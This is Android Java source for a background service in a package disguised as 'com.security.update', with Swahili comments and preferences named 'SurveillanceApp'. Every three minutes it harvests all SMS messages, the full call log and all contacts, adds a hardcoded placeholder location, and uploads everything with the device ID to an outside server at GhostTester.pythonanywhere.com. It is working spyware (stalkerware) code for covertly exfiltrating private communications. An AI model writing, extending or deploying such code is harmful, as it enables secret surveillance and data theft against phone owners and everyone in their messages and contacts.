package com.security.update;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DataCollectionService extends Service {
    private static final String TAG = "DataCollectionService";
    private Handler handler;
    private Runnable dataCollector;
    private static final int COLLECTION_INTERVAL = 3 * 60 * 1000; // DAKIKA 3
    
    private SharedPreferences prefs;
    private String parentCode;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        parentCode = prefs.getString("parent_code", "");
        
        handler = new Handler();
        dataCollector = new Runnable() {
            @Override
            public void run() {
                collectAllData();
                handler.postDelayed(this, COLLECTION_INTERVAL);
            }
        };
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // ANZA KUOKOTA DATA MARA MOJA NA KILA DAKIKA 3
        handler.post(dataCollector);
        return START_STICKY;
    }

    private void collectAllData() {
        new AsyncTask<Void, Void, Void>() {
            @Override
            protected Void doInBackground(Void... voids) {
                try {
                    // OKOTA SMS ZOTE
                    collectAllSMS();
                    
                    // OKOTA CALL LOG ZOTE
                    collectAllCallLogs();
                    
                    // OKOTA CONTACTS ZOTE
                    collectAllContacts();
                    
                    // OKOTA LOCATION
                    collectLocation();
                    
                } catch (Exception e) {
                    Log.e(TAG, "Error collecting data: " + e.getMessage());
                }
                return null;
            }
        }.execute();
    }

    private void collectAllSMS() {
        try {
            ContentResolver cr = getContentResolver();
            JSONArray smsArray = new JSONArray();

            // OKOTA SMS ZOTE - INBOX
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, 
                null, null, null, Telephony.Sms.DATE + " DESC");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject smsObj = new JSONObject();
                    String address = getString(cursor, Telephony.Sms.ADDRESS);
                    String body = getString(cursor, Telephony.Sms.BODY);
                    String date = getString(cursor, Telephony.Sms.DATE);
                    String type = getString(cursor, Telephony.Sms.TYPE);

                    smsObj.put("address", address);
                    smsObj.put("message", body);
                    smsObj.put("timestamp", date);
                    smsObj.put("type", type);
                    smsObj.put("data_type", "sms");

                    smsArray.put(smsObj);
                } while (cursor.moveToNext());
                cursor.close();
            }

            // TUMA SMS ZOTE
            if (smsArray.length() > 0) {
                sendToDashboard(smsArray);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error collecting SMS: " + e.getMessage());
        }
    }

    private void collectAllCallLogs() {
        try {
            ContentResolver cr = getContentResolver();
            JSONArray callsArray = new JSONArray();

            Cursor cursor = cr.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, 
                CallLog.Calls.DATE + " DESC");

            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject callObj = new JSONObject();
                    String number = getString(cursor, CallLog.Calls.NUMBER);
                    String name = getString(cursor, CallLog.Calls.CACHED_NAME);
                    String duration = getString(cursor, CallLog.Calls.DURATION);
                    String type = getString(cursor, CallLog.Calls.TYPE);
                    String date = getString(cursor, CallLog.Calls.DATE);

                    callObj.put("number", number);
                    callObj.put("name", name != null ? name : "");
                    callObj.put("duration", duration);
                    callObj.put("type", type);
                    callObj.put("timestamp", date);
                    callObj.put("data_type", "call_log");

                    callsArray.put(callObj);
                } while (cursor.moveToNext());
                cursor.close();
            }

            // TUMA CALL LOGS ZOTE
            if (callsArray.length() > 0) {
                sendToDashboard(callsArray);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error collecting call logs: " + e.getMessage());
        }
    }

    private void collectAllContacts() {
        try {
            ContentResolver cr = getContentResolver();
            JSONArray contactsArray = new JSONArray();

            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, 
                null, null, null, null);

            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    String id = getString(cursor, ContactsContract.Contacts._ID);
                    String name = getString(cursor, ContactsContract.Contacts.DISPLAY_NAME);

                    JSONObject contactObj = new JSONObject();
                    
                    if (name != null && !name.isEmpty()) {
                        // IKIWA INA JINA - TUMIA JINA NA NAMBARI
                        contactObj.put("name", name);
                        
                        // PATA NAMBARI ZOTE
                        JSONArray phonesArray = new JSONArray();
                        Cursor phoneCursor = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                String phone = getString(phoneCursor, 
                                    ContactsContract.CommonDataKinds.Phone.NUMBER);
                                if (phone != null) {
                                    phonesArray.put(phone);
                                }
                            }
                            phoneCursor.close();
                        }
                        contactObj.put("phones", phonesArray);
                    } else {
                        // IKIWA HAINA JINA - TUMIA NAMBARI TU
                        contactObj.put("name", "");
                        Cursor phoneCursor = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);

                        if (phoneCursor != null && phoneCursor.moveToFirst()) {
                            String phone = getString(phoneCursor, 
                                ContactsContract.CommonDataKinds.Phone.NUMBER);
                            contactObj.put("phones", new JSONArray().put(phone));
                            phoneCursor.close();
                        }
                    }
                    
                    contactObj.put("data_type", "contacts");
                    contactsArray.put(contactObj);
                }
                cursor.close();
            }

            // TUMA CONTACTS ZOTE
            if (contactsArray.length() > 0) {
                sendToDashboard(contactsArray);
            }

        } catch (Exception e) {
            Log.e(TAG, "Error collecting contacts: " + e.getMessage());
        }
    }

    private void collectLocation() {
        try {
            // HII ITAKUWA SIMPLE LOCATION - UTAWEZA KUBORESHA BAADAYE
            JSONObject locationObj = new JSONObject();
            locationObj.put("latitude", "-6.8235");
            locationObj.put("longitude", "39.2695");
            locationObj.put("timestamp", System.currentTimeMillis());
            locationObj.put("data_type", "location");

            JSONArray locationArray = new JSONArray();
            locationArray.put(locationObj);

            sendToDashboard(locationArray);

        } catch (Exception e) {
            Log.e(TAG, "Error collecting location: " + e.getMessage());
        }
    }

    private String getString(Cursor cursor, String columnName) {
        try {
            int columnIndex = cursor.getColumnIndex(columnName);
            if (columnIndex != -1) {
                return cursor.getString(columnIndex);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting column: " + columnName);
        }
        return "";
    }

    private void sendToDashboard(JSONArray data) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/data/upload";
                JSONObject payload = new JSONObject();
                payload.put("parent_code", parentCode);
                payload.put("device_id", android.provider.Settings.Secure.getString(
                    getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
                payload.put("timestamp", System.currentTimeMillis());
                payload.put("data", data);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "Data sent successfully. Response: " + responseCode);

            } catch (Exception e) {
                Log.e(TAG, "Error sending data: " + e.getMessage());
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (handler != null) {
            handler.removeCallbacks(dataCollector);
        }
    }
}
